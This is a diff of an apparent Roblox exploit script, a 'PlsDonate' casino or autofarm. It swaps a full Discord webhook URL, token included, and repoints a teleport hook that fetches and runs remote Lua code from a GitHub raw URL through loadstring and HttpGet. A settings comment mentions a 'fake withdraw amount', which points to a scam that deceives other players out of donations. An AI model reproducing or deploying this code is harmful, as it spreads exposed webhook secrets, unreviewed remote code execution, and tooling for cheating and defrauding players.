@@ -1,6 +1,6 @@
 getgenv().settin = {
     ['WebHook'] = {
-        ['Webhook'] = "https://discord.com/api/webhooks/1020051419967000647/kmR4dFiG7My7RekiRXj0AHZZPoOAD-yBcQr8pM3TixHlJsAtBo9vDZn-4r5nWPYrVuKH",
+        ['Webhook'] = "https://discord.com/api/webhooks/1075082733396705280/s8M3oDnCa2U2uE-uFSpP7TiP2kVMmxEgdTftUHURlywEv8L62WrydLf-KS0s12aMNYue",
     },
     ['ServerHopDelay'] = 15, -- minutes, resets every donation
     ['MinimumWithdrawAmount'] = 1000, -- fake withdraw amount
@@ -54,7 +54,7 @@ local unclaimed = {}
 local errCount = -1
 
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/casino.lua'))()")
+queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/sdhhf1245/script/main/casino.lua'))()")
 
 if not getgenv().settin then
 	getgenv().settin = {
